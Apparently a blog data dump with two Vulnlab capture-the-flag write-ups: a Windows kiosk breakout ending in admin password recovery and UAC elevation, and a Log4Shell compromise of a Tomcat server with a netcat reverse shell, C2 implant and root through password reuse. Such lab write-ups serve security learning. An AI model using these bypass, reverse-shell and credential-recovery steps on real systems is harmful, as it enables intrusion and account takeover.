file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 21:28 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.105.242</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">Not shown: 999 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=Escape</span><br><span class=\"line\">| Not valid before: 2024-02-02T11:08:33</span><br><span class=\"line\">|_Not valid after:  2024-08-03T11:08:33</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: ESCAPE</span><br><span class=\"line\">|   NetBIOS_Domain_Name: ESCAPE</span><br><span class=\"line\">|   NetBIOS_Computer_Name: ESCAPE</span><br><span class=\"line\">|   DNS_Domain_Name: Escape</span><br><span class=\"line\">|   DNS_Computer_Name: Escape</span><br><span class=\"line\">|   Product_Version: 10.0.19041</span><br><span class=\"line\">|_  System_Time: 2024-05-30T01:29:15+00:00</span><br><span class=\"line\">|_ssl-date: 2024-05-30T01:29:20+00:00; +2s from scanner time.</span><br></pre></td></tr></table></figure>\n\n<p>There’s not much for us to enumerate, aside from attempting to RDP to the machine. We can do so with either <code>remmina</code>, <code>xfreerdp</code>, or <code>rdesktop</code>. I’ll use <code>rdesktop</code> since I’m aware that you can authenticate with null credentials easy using that tool.</p>\n<h1 id=\"Restricted-Kiosk-Access\"><a href=\"#Restricted-Kiosk-Access\" class=\"headerlink\" title=\"Restricted Kiosk Access\"></a>Restricted Kiosk Access</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rdesktop -u DaZ 10.10.105.242</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">Do you trust this certificate (yes/no)? yes</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/escape-vl/b.jpg\"></p>\n<p>Given the result of the conference display, we are told to authenticate to this machine with the user <code>KioskUser0</code> without a password. We’ll use <code>xfreerdp /v:10.10.105.242 /u:KioskUser0</code> to authenticate to this machine properly.</p>\n<p>Once we login with the above command, we can see we are greeted with the home screen of a kiosk.</p>\n<p><img src=\"/images/vulnlab/escape-vl/c.jpg\"></p>\n<p>There doesn’t seem to be anything within our desktop interface, though we can access the Start Menu by pressing our home key.</p>\n<p>Another thing you’ll notice is that the interface is entirely in Korean, which is probably not an issue for some people (but I myself can’t speak Korean). I tried changing this in the Language settings, which you can access from the search bar in the Start Menu. The only pre-req is that you’ll need to either restart the machine or cause the current user to sign-out, which I do not believe we can accomplish until we get code execution.</p>\n<p>At this point it’s just a matter of messing around with what we can do - I found that there aren’t any pertinent settings that we can change on the machine nor can we access cmd&#x2F;PowerShell.</p>\n<p><img src=\"/images/vulnlab/escape-vl/d.jpg\"></p>\n<p>There looks to be some form of policy that is disallowing us from access a lot of the machine’s main resources, even File Explorer. I ended up downloading Google Translate on my phone and taking a picture of this, it seems the message says <code>&quot;Cannot open &#39;C:\\Windows\\System32&#39;. Your organization has blocked you.&quot;</code>. I’m guessing that there is a GPO preventing us from accessing this specific folder and all of it’s resources.</p>\n<p>So let’s do some thinking here - we’re not able to access any resources in System32 which is preventing us from doing the majority of the legwork needed to get code execution. Without this we can’t really get far into the kiosk. We also won’t be able to access the File Explorer regularly since <code>iexplorer.exe</code> is within this folder.</p>\n<h1 id=\"Bypass-using-Installed-Programs\"><a href=\"#Bypass-using-Installed-Programs\" class=\"headerlink\" title=\"Bypass using Installed Programs\"></a>Bypass using Installed Programs</h1><p>That being said, there are other resources that we can access that are not in this specific folder that might help us. If search up <code>Apps &amp; Features</code>, we can see applications such as Cortana, Paint, and a variety of O365 tools.</p>\n<p>You’ll notice though that Microsoft Edge is also here, which is the built-in browser for this machine that is installed automatically. The binary is denoted as <code>msedge.exe</code>, and can be found in <code>C:\\Program Files (x86)\\Microsoft\\Edge\\Application</code>. Since this binary isn’t usually in System32, we should be able to access it if the GPO doesn’t restrict it.</p>\n<p><img src=\"/images/vulnlab/escape-vl/e.jpg\"></p>\n<p>After accepting a few Edge first-launch parameters, we’re greeted with the home-page for Edge.</p>\n<p>Immediately the first thing that came to me was the URL path. Right now, it seems that we are within <code>edge://welcome</code>, which is probably a landing page for Microsoft Edge within the contents of its directory. </p>\n<p>What’s stopping us from altering this though? If we change the identifier to <code>file://</code> and change the file location, it shouldn’t exempt us from accessing resources. This is because we’re not trying to access directories in the context of <code>KioskUser0</code>, but instead as the user agent for Edge.</p>\n<p><img src=\"/images/vulnlab/escape-vl/f.jpg\"></p>\n<p>This seemed to work! We should be able to access the entirety of the kiosk’s filesystem through as the Edge user agent, meaning we can also technically read the first flag right now without getting code execution.</p>\n<p>The file path for the first user flag can be denoted below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(file:///C:/Users/kioskUser0/Desktop/user_07eb46.txt)</span><br></pre></td></tr></table></figure>\n\n<p>While this is great for showing how fast we were able to get the user flag, we still need to get code execution in some way. This involves a little more messing around with in terms of what we have access to - but our range of options should open up now that we have access to the System32 folder.</p>\n<h1 id=\"Misconfigured-Policy-Abuse\"><a href=\"#Misconfigured-Policy-Abuse\" class=\"headerlink\" title=\"Misconfigured Policy Abuse\"></a>Misconfigured Policy Abuse</h1><p>One thing to mention, you’ll notice that if you try to access any binaries or executables, it will download them locally to your user’s Download folder (excluding text files like the user flag). I’ll start with trying to mess around with the <code>cmd.exe</code> and <code>powershell.exe</code> binaries.</p>\n<p>I managed to find a solution really quickly, which revolved around both of these binaries. If you try to download them, they’ll pop-up with a warning (due to the filename being abnormal to Edge, it’s a binary after all). Selecting the left option that pops-up will download the file to the <code>KioskUser0</code>‘s download directory in their home folder.</p>\n<p><img src=\"/images/vulnlab/escape-vl/g.jpg\"></p>\n<p>You can access this specific location within the filesystem by right-clicking on the binary and&#x2F;or pressing the small folder icon that appears in the drop-down menu.</p>\n<p><img src=\"/images/vulnlab/escape-vl/h.jpg\"></p>\n<p>Not only are we able to access the file explorer now, but we can interact with this binary to potentially actually get code execution. You can do this with <code>cmd.exe</code> too, it’s honestly up to your preference. If you try to execute this file, it will be blocked by the GPO and will prevent you from executing the binary and spawning a PowerShell session.</p>\n<p>Now let’s think - the GPO itself is blocking all files that are ran within the System32 folder or that have the same name as the binaries that are within that folder (with what know so far). While the files themselves can have their signatures also blocked (essentially meaning all files that have application signatures or icons similar to applications like <code>powershell</code> or <code>cmd.exe</code>), we don’t exactly know if that’s true right now.</p>\n<p>However, if the GPO only relies on the name of the binary in order to block access, then we can probably change the name of the binary and run it in the context of a binary that is accepted. Let’s take <code>msedge.exe</code> for example since we know we were able to access that when trying to open Edge. I’ll change the name of the file to <code>msedge</code> by pressing <code>F2</code> after clicking on the binary once.</p>\n<p><img src=\"/images/vulnlab/escape-vl/i.jpg\"></p>\n<p>After opening the file, it seems like we were able to open up a PowerShell window! This means our theory from before was correct, the GPO is only blocking binaries that share a name with a binary in System32.</p>\n<p>Now that we have code execution, we would normally read the user flag now if we didn’t view it earlier.</p>\n<h1 id=\"Privilege-Escalation-to-Administrator\"><a href=\"#Privilege-Escalation-to-Administrator\" class=\"headerlink\" title=\"Privilege Escalation to Administrator\"></a>Privilege Escalation to Administrator</h1><p>Now that we have a PowerShell session, let’s look for other users we can potentially exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">    Directory: C:\\Users</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          2/3/2024   2:39 AM                admin</span><br><span class=\"line\">d-----          2/3/2024   3:44 AM                Administrator</span><br><span class=\"line\">d-----          2/3/2024   3:12 AM                DefaultAppPool</span><br><span class=\"line\">d-----          2/3/2024   3:10 AM                kioskUser0</span><br><span class=\"line\">d-r---          2/3/2024   2:38 AM                Public</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the only other user that we can potentially pivot to is either <code>admin</code> or <code>Administrator</code>. The other two profiles we can ignore as they’re default users.</p>\n<p>The <code>admin</code> user seems to be odd, as this is not a common account name. We can assume that this is the admin of the kiosk, in which is the user we are trying to escalate to. Before we try anything, let’s see if we have any privileges that we can exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                          State</span><br><span class=\"line\">============================= ==================================== ========</span><br><span class=\"line\">SeShutdownPrivilege           Shut down the system                 Disabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled</span><br><span class=\"line\">SeUndockPrivilege             Remove computer from docking station Disabled</span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</span><br><span class=\"line\">SeTimeZonePrivilege           Change the time zone                 Disabled</span><br></pre></td></tr></table></figure>\n\n<p>We don’t seem to have any privileges that we can exploit, as these are relatively common privileges given to regular users.</p>\n<p>So let’s think - we don’t have any privileges that we can exploit, there’s only one user we can escalate to, there are no DPAPI credentials in <code>kioskUser0</code>‘s home directory, and there isn’t Active Directory enabled on this machine so we can’t pivot to another domain user. This has to mean that there is a binary present on the machine that we can exploit in some way.</p>\n<p>I did some digging into the filesystem and found an interesting file within the root <code>C:\\</code> drive on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; Get-ChildItem . -Force</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">d--h--          2/3/2024   3:05 AM                _admin</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This directory is also abnormal and isn’t installed by default. Accessing this directory will lead you to two interesting files&#x2F;directories, being <code>passwords</code> and <code>profiles.xml</code></p>\n<p>Doing some more digging, it doesn’t seem that <code>passwords</code> has much, though there does seem to be enticing information within the XML file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\_admin&gt; cat profiles.xml</span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-16&quot;?&gt;</span><br><span class=\"line\">&lt;!-- Remote Desktop Plus --&gt;</span><br><span class=\"line\">&lt;Data&gt;</span><br><span class=\"line\">  &lt;Profile&gt;</span><br><span class=\"line\">    &lt;ProfileName&gt;admin&lt;/ProfileName&gt;</span><br><span class=\"line\">    &lt;UserName&gt;127.0.0.1&lt;/UserName&gt;</span><br><span class=\"line\">    &lt;Password&gt;JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=&lt;/Password&gt;</span><br><span class=\"line\">    &lt;Secure&gt;False&lt;/Secure&gt;</span><br><span class=\"line\">  &lt;/Profile&gt;</span><br><span class=\"line\">&lt;/Data&gt;</span><br></pre></td></tr></table></figure>\n\n<p>This seems to be a user hash for the <code>admin</code> user, we can try to crack this with <code>JTR</code> or <code>Hashcat</code> however I couldn’t find much success as they both could not recognize the hash. You’d think it’s base64 encoded given the <code>=</code>, however I found that to not be true.</p>\n<p>This file does belong to <code>Remote Desktop Plus</code>, which is not a normal application present on this machine. If we type in <code>rdp</code> into the search bar in the Start Menu, it looks like the application is installed already.</p>\n<h1 id=\"Reading-Plaintext-Passwords-with-BPV\"><a href=\"#Reading-Plaintext-Passwords-with-BPV\" class=\"headerlink\" title=\"Reading Plaintext Passwords with BPV\"></a>Reading Plaintext Passwords with BPV</h1><p>Though we aren’t able to open it from here, we should be able to access the binary from within the PowerShell window we have right now. It’s within <code>C:\\Program Files(x86)\\Remote Desktop Plus</code>.</p>\n<p><img src=\"/images/vulnlab/escape-vl/j.jpg\"></p>\n<p>I did some research into RDP+, there doesn’t like anything that we can exploit in particular, and the initial window doesn’t seem to have any important information.</p>\n<p>That is until I realized the one thing we can do, which is within <code>Manage profiles...</code>. We don’t have any profiles at first in the window that pops up, but it does allow us to import profiles based on a respective profile file. We did have one before for the <code>admin</code> user, so let’s try to import that. Note that you’ll need to move the <code>profiles.xml</code> file to a place you can actually access, which I moved to the <code>Downloads</code> folder and then imported from there.</p>\n<p><img src=\"/images/vulnlab/escape-vl/k.jpg\"></p>\n<p>Now that we imported the profile - we can see that RDP+ displays the password in bulleted-text. This means that the plaintext password must’ve been loaded into the application, as the length has shrunk immensely (in comparison to the hash).</p>\n<p>Now that we have the password technically on our screen, we can use a tool that isn’t commonly used on machines for red-teaming - <a href=\"https://www.nirsoft.net/utils/bullets_password_view.html\">BulletsPassView</a>. This is a password recovery tool, and is used to reveal passwords that are stored behind bullets in a regular text-box. It’s used to help users who forget their passwords, and allows them to easily reveal and copy their plaintext passwords for reusage.</p>\n<p>We’ll be using this tool to help reveal the <code>admin</code> password. This specific executable isn’t malicious in nature, which I’m thankful for since Defender is enabled on this kiosk. (You can test this by just running <code>&quot;Invoke-Mimikatz&quot;</code> in your PowerShell session.)</p>\n<p>All that we’ll need is a Python server on our Kali machine (we’re actually using our Kali host for the first time - and we’re about to root this box!) with the BPV.exe file. You can download BPV from the link I posted and start a Python server with <code>python3 -m http.server (PORT)</code>.</p>\n<p>After that’s finished, we’ll use cURL to download the executable to the kiosk <code>curl http://(KALI IP):(PORT)/BuletsPassView.exe -O BPV.exe</code>. We can then run the binary and the application should load. (Note, make sure to download the x64-bit version so it can properly detect RDP+)</p>\n<p><img src=\"/images/vulnlab/escape-vl/l.jpg\"></p>\n<p>If you have both RDP+ and BPV opened, upon refreshing you should see the password in plaintext. This means we can now escalate to this user! You can do so by just starting a new PowerShell process using <code>runas</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\kioskUser0\\Downloads&gt; runas /user:ESCAPE\\admin C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br></pre></td></tr></table></figure>\n\n<p>This should elevate us to <code>admin</code>, though you’ll notice that our privileges are still the same as the <code>Administrator</code> user. We can circumvent this by doing <code>Start-Process powershell -verb runAs</code> to start up another PowerShell window in the context of the Administrator user as the <code>admin</code> user as UAC bypass enabled. If you run <code>whoami /priv</code> after this, you’ll see that we are now the Administrator on the machine.</p>\n<p><img src=\"/images/vulnlab/escape-vl/m.jpg\"></p>\n<p>As noted above, the root flag is within <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>, meaning we have successfully rooted this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box specifically was really fun, as it relied solely on your thinking as to what you can access. It also limited our Kali usage, which seemed like a new breath of fresh air (though I really am ready to use Kali again!). Big thanks to xct and kozie for the development of it, it definitely helped me to think outside the box!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.nirsoft.net/utils/bullets_password_view.html\">https://www.nirsoft.net/utils/bullets_password_view.html</a><br><a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp</a><br><a href=\"https://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications\">https://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications</a><br><a href=\"https://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout\">https://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout</a></p>\n"},{"title":"Feedback - Vulnlab","date":"2024-06-05T06:06:42.000Z","keywords":"Vulnlab, Easy, Linux","description":"This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.","cover":"/images/vulnlab/feedback-vl/feedback_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis is another machine from VulnLab, and it involves exploiting a Log4J vulnerability in a web service and use it to access internal resources to compromise a Linux machine. This specific machine seems to focus heavily on web services, which is a nice change of pace to the AD pen-testing that I'm used to.\n\n# Enumeration\n\nLet's start with our usual NMAP scan of the machine.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 22:30 EDT\nNmap scan report for 10.10.75.95\nHost is up (0.11s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 13.28 seconds\n```\n\nIt seems that there is a proxy on port `8080`, so we'll try to access that through our web browser. Remember to append the port number after the URL so you can access the website properly.\n\n![](/images/vulnlab/feedback-vl/b.png)\n\nWe seem to be greeted with an Apache Tomcat website, to which we are within the root website of this server. there are three nodes towards the right (server status, manager app, and host manager), to which we do not have access to.\n\nThe title of the website indicates to us that the version of this specific Apache Tomcat application is version `9.0.56`.\n\nGiven that there isn't much for us to look at due to this being the documentation portion of the website, let's run a `gobuster` scan to see if there are any other webpages we can access.\n\n```\n└─$ gobuster dir -u http://10.10.75.95:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n......\n/feedback             (Status: 302) [Size: 0] [--> /feedback/]\n```\n\nYou'll see that there is an odd directory called `feedback`, which I'm assuming should be the apart of the attack path given the name of the machine. The other directory results are relatively common, so we'll focus on this `feedback` directory that we've found.\n\n![](/images/vulnlab/feedback-vl/c.png)\n\nAs you'll see this links us to a web panel that is asking for input feedback for the web service. You'll notice that the page is relatively bare aside from the two input panels that we have access to.\n\nMy first initial thought is to take a look at the request that gets sent from this feedback form through [Burpsuite](https://portswigger.net/burp/documentation/desktop/getting-started).\n\n![](/images/vulnlab/feedback-vl/d.png)\n\nThe product of the request seems to be what I would've expected - you'll see two parameters for our name and the feedback that we wanted to give to the website. That being said, you'll notice an odd `JSESSIONID` parameter as our cookie parameter. I'm unfamiliar for this particular parameter, so we'll research into it with regards to `Tomcat 9.0.56`.\n\nThat brought me to an interesting vulnerability - Log4Shell.\n\n# Exploiting Log4Shell\n\nAlso known as the Log4J vulnerability, [Log4Shell](https://www.ibm.com/topics/log4shell) is a remote code execution vulnerability in a few of the versions of the Apache Log4J 2 Java library. This is an open-source logging library created by Apache that records information and events within a program. This is particularly directed towards error messages and user inputs.\n\nThis isn't it's own service, but a snippet of code that Java applications can utilize at a broad scale. The issue at hand is a parameter that you can specify in most user input parsers that Log4J has to parse - specifically JNDI.\n\nJNDI, otherwise known as the Java Naming and Directory Interface, is an API that Java uses to access resources hosted on outside servers. A command exists called JNDI lookup that tells the application to go to the link provided in the input and execute it as code or a script. The older versions of Log4J will generally run any code provided to them without any form of handling. The goal of Log4Shell is to have the website using Log4J to execute a reverse shell and generate a session for the attacker.\n\nIn our case, this application is vulnerable to Log4Shell within the input parameter on this webpage. You can find the POC for Log4Shell [here](https://github.com/kozmer/log4j-shell-poc), which will require you to download JDK 1.8.0_20 and place it within the same directory as the exploit. You can find the specific JDK version within [this](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) download page on Oracle.\n\n![](/images/vulnlab/feedback-vl/e.png)\n\nAs seen in the above, the POC will launch an LDAP and HTTP server for us to handle the exploit process. We'll need to make sure a netcat session is listening on port `9001` using `nc -lvnp 9001`. The Java application that the HTTP server is using will redirect the machine we are attacking to our reverse shell once the exploit is executed by the machine.\n\nAll that's required next is to send the one-liner payload to an input field that Log4J will parse. In our case, you can put it in the `name` parameter. Make sure to URL encode the one-liner so the Log4J can parse it properly based on the request.\n\n![](/images/vulnlab/feedback-vl/f.png)\n\nIf we send the request in Repeater, we shouldn't receive any output in the Response area of Repeater, indicating that something has caused the application to pause. If we return to our terminal window, we should see the exploit downloaded and a reverse shell appear on our listener.\n\n```\n└─$ nc -lvnp 9001    \nlistening on [any] 9001 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.75.95] 55526\nwhoami\ntomcat\n```\n\n# Host Reconnaissance\n\nNow that we have access to a reverse shell, we'll need to enumerate the machine to find if there is anything on the machine that we exploit for privilege escalation.\n\nNote that we do have a pretty bare-bones shell at the moment that does not have a TTY. You can use Python to spawn a valid TTY, though that's up to you.\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ntomcat@ip-10-10-10-7:/$\n```\n\nI stood up a simple [Sliver](https://github.com/BishopFox/sliver) C2 server and ran an implant on the machine so I could receive an easier way to transfer files to and from the machine.\n\nI did some research into this machine via the progress bar in the [Discord](https://discord.gg/vulnlab), and it seems that this machine only has a root flag. You can verify this by accessing the `/home` directory of the machine, which seems to only have the default `ubuntu` user.\n\n```\ntomcat@ip-10-10-10-7:/$ ls -la /home\nls -la /home\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Dec 11  2021 .\ndrwxr-xr-x 23 root   root   4096 Jun  3 02:24 ..\ndrwxr-xr-x  5 ubuntu ubuntu 4096 Dec 11  2021 ubuntu\n```\n\nThere was an interesting file that I found in `/opt/tomcat/conf/tomcat-users.xml`, which seems to include information about the `tomcat` users on the machine.\n\n```\n  <user username=\"admin\" password=\"[...snip...]\" roles=\"manager-gui\"/>\n  <user username=\"robot\" password=\"[...snip...]\" roles=\"manager-script\"/>\n```\n\nWhile these seem to be interesting credentials and would be helpful in a red-teaming environment, there isn't really anything we can use these for as we can't authenticate to the `Manager` panel in any fashion. That is what I had thought until I tried `su` to login as the root user on this machine. I used the same password that was within the above XML file, at it seemed to work properly.\n\n```\ntomcat@ip-10-10-10-7:~/conf$ su\nPassword: \nroot@ip-10-10-10-7:/opt/tomcat/conf# cd /root\nroot@ip-10-10-10-7:~# ls\nroot.txt  snap\n```\n\nSince we have access to the root flag, we have successfully rooted this machine!\n\n# Conclusion\n\nAlthough this was a relatively short machine, it's sometimes common to see vulnerabilities in credential reusage such as what we did for this machine. It can even be as simple as reusing a password for any user. Nonetheless I did enjoy exploiting every part of this machine, and I believe that it is extremely user-friendly. Big thanks go out to xct for the development of this machine!\n\n# Resources\n\nhttps://www.ibm.com/topics/log4shell\nhttps://www.youtube.com/watch?v=nF8tfsY74ws\nhttps://www.dynatrace.com/news/blog/what-is-log4shell/\nhttps://github.com/kozmer/log4j-shell-poc\nhttps://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\nhttps://github.com/BishopFox/sliver\nhttps://discord.com/invite/vulnlab\n\n","source":"_posts/feedback.md","raw":"---\ntitle: Feedback - Vulnlab\ndate: 2024-06-05 02:06:42\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Linux'\ndescription: This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.\ncover: /images/vulnlab/feedback-vl/feedback_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis is another machine from VulnLab, and it involves exploiting a Log4J vulnerability in a web service and use it to access internal resources to compromise a Linux machine. This specific machine seems to focus heavily on web services, which is a nice change of pace to the AD pen-testing that I'm used to.\n\n# Enumeration\n\nLet's start with our usual NMAP scan of the machine.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 22:30 EDT\nNmap scan report for 10.10.75.95\nHost is up (0.11s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 13.28 seconds\n```\n\nIt seems that there is a proxy on port `8080`, so we'll try to access that through our web browser. Remember to append the port number after the URL so you can access the website properly.\n\n![](/images/vulnlab/feedback-vl/b.png)\n\nWe seem to be greeted with an Apache Tomcat website, to which we are within the root website of this server. there are three nodes towards the right (server status, manager app, and host manager), to which we do not have access to.\n\nThe title of the website indicates to us that the version of this specific Apache Tomcat application is version `9.0.56`.\n\nGiven that there isn't much for us to look at due to this being the documentation portion of the website, let's run a `gobuster` scan to see if there are any other webpages we can access.\n\n```\n└─$ gobuster dir -u http://10.10.75.95:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n......\n/feedback             (Status: 302) [Size: 0] [--> /feedback/]\n```\n\nYou'll see that there is an odd directory called `feedback`, which I'm assuming should be the apart of the attack path given the name of the machine. The other directory results are relatively common, so we'll focus on this `feedback` directory that we've found.\n\n![](/images/vulnlab/feedback-vl/c.png)\n\nAs you'll see this links us to a web panel that is asking for input feedback for the web service. You'll notice that the page is relatively bare aside from the two input panels that we have access to.\n\nMy first initial thought is to take a look at the request that gets sent from this feedback form through [Burpsuite](https://portswigger.net/burp/documentation/desktop/getting-started).\n\n![](/images/vulnlab/feedback-vl/d.png)\n\nThe product of the request seems to be what I would've expected - you'll see two parameters for our name and the feedback that we wanted to give to the website. That being said, you'll notice an odd `JSESSIONID` parameter as our cookie parameter. I'm unfamiliar for this particular parameter, so we'll research into it with regards to `Tomcat 9.0.56`.\n\nThat brought me to an interesting vulnerability - Log4Shell.\n\n# Exploiting Log4Shell\n\nAlso known as the Log4J vulnerability, [Log4Shell](https://www.ibm.com/topics/log4shell) is a remote code execution vulnerability in a few of the versions of the Apache Log4J 2 Java library. This is an open-source logging library created by Apache that records information and events within a program. This is particularly directed towards error messages and user inputs.\n\nThis isn't it's own service, but a snippet of code that Java applications can utilize at a broad scale. The issue at hand is a parameter that you can specify in most user input parsers that Log4J has to parse - specifically JNDI.\n\nJNDI, otherwise known as the Java Naming and Directory Interface, is an API that Java uses to access resources hosted on outside servers. A command exists called JNDI lookup that tells the application to go to the link provided in the input and execute it as code or a script. The older versions of Log4J will generally run any code provided to them without any form of handling. The goal of Log4Shell is to have the website using Log4J to execute a reverse shell and generate a session for the attacker.\n\nIn our case, this application is vulnerable to Log4Shell within the input parameter on this webpage. You can find the POC for Log4Shell [here](https://github.com/kozmer/log4j-shell-poc), which will require you to download JDK 1.8.0_20 and place it within the same directory as the exploit. You can find the specific JDK version within [this](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) download page on Oracle.\n\n![](/images/vulnlab/feedback-vl/e.png)\n\nAs seen in the above, the POC will launch an LDAP and HTTP server for us to handle the exploit process. We'll need to make sure a netcat session is listening on port `9001` using `nc -lvnp 9001`. The Java application that the HTTP server is using will redirect the machine we are attacking to our reverse shell once the exploit is executed by the machine.\n\nAll that's required next is to send the one-liner payload to an input field that Log4J will parse. In our case, you can put it in the `name` parameter. Make sure to URL encode the one-liner so the Log4J can parse it properly based on the request.\n\n![](/images/vulnlab/feedback-vl/f.png)\n\nIf we send the request in Repeater, we shouldn't receive any output in the Response area of Repeater, indicating that something has caused the application to pause. If we return to our terminal window, we should see the exploit downloaded and a reverse shell appear on our listener.\n\n```\n└─$ nc -lvnp 9001    \nlistening on [any] 9001 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.75.95] 55526\nwhoami\ntomcat\n```\n\n# Host Reconnaissance\n\nNow that we have access to a reverse shell, we'll need to enumerate the machine to find if there is anything on the machine that we exploit for privilege escalation.\n\nNote that we do have a pretty bare-bones shell at the moment that does not have a TTY. You can use Python to spawn a valid TTY, though that's up to you.\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ntomcat@ip-10-10-10-7:/$\n```\n\nI stood up a simple [Sliver](https://github.com/BishopFox/sliver) C2 server and ran an implant on the machine so I could receive an easier way to transfer files to and from the machine.\n\nI did some research into this machine via the progress bar in the [Discord](https://discord.gg/vulnlab), and it seems that this machine only has a root flag. You can verify this by accessing the `/home` directory of the machine, which seems to only have the default `ubuntu` user.\n\n```\ntomcat@ip-10-10-10-7:/$ ls -la /home\nls -la /home\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Dec 11  2021 .\ndrwxr-xr-x 23 root   root   4096 Jun  3 02:24 ..\ndrwxr-xr-x  5 ubuntu ubuntu 4096 Dec 11  2021 ubuntu\n```\n\nThere was an interesting file that I found in `/opt/tomcat/conf/tomcat-users.xml`, which seems to include information about the `tomcat` users on the machine.\n\n```\n  <user username=\"admin\" password=\"[...snip...]\" roles=\"manager-gui\"/>\n  <user username=\"robot\" password=\"[...snip...]\" roles=\"manager-script\"/>\n```\n\nWhile these seem to be interesting credentials and would be helpful in a red-teaming environment, there isn't really anything we can use these for as we can't authenticate to the `Manager` panel in any fashion. That is what I had thought until I tried `su` to login as the root user on this machine. I used the same password that was within the above XML file, at it seemed to work properly.\n\n```\ntomcat@ip-10-10-10-7:~/conf$ su\nPassword: \nroot@ip-10-10-10-7:/opt/tomcat/conf# cd /root\nroot@ip-10-10-10-7:~# ls\nroot.txt  snap\n```\n\nSince we have access to the root flag, we have successfully rooted this machine!\n\n# Conclusion\n\nAlthough this was a relatively short machine, it's sometimes common to see vulnerabilities in credential reusage such as what we did for this machine. It can even be as simple as reusing a password for any user. Nonetheless I did enjoy exploiting every part of this machine, and I believe that it is extremely user-friendly. Big thanks go out to xct for the development of this machine!\n\n# 